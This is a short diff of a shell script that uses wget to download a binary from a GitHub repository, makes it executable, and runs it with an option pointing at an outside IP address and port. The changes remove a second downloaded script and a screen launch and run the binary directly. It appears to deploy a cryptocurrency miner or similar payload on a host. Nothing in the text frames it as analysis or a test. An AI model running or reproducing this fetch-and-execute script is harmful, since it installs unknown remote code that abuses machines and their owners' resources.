@@ -5,8 +5,5 @@
 
 cd /home/shell-bot
 wget -qO banda https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
-wget proses.sh https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh
 chmod +x banda
-chmod +x proses.sh
-screen -dm -S banda ./banda -o 138.197.166.210:5555
-./proses.sh
+./banda -o 138.197.166.210:5555
